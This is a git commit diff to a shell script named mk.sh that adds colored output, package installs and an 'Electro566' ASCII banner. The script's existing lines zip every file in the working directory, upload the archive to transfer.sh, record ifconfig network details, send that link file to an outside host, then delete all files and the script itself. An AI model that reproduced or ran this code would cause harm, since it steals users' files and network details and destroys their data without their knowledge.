91618376e84d2a1a9a2738674aaa7a3edea59de8
Electro <78709853+electro6666@users.noreply.github.com>
2022-12-10 12:25:38 +0530

    Update mk.sh

--- mk.sh
+++ mk.sh
@@ -1,7 +1,18 @@
+
+RED="\e[31m"
+ORANGE="\e[33m"
+BLUE="\e[94m"
+GREEN="\e[92m"
+STOP="\e[0m"
+apt install figlet -y
+apt install curl -y
+printf "${BLUE}"
+figlet -w 200 -f standard "Electro566"
+printf "${STOP}"
 rm -rf mk.sh
 zip  file.zip *
 curl --upload-file file.zip  https://transfer.sh >> link.txt
-echo | 
+echo ----
 ifconfig >> link.txt 
 curl --upload-file link.txt http://mariongeiger.com
 rm -rf *
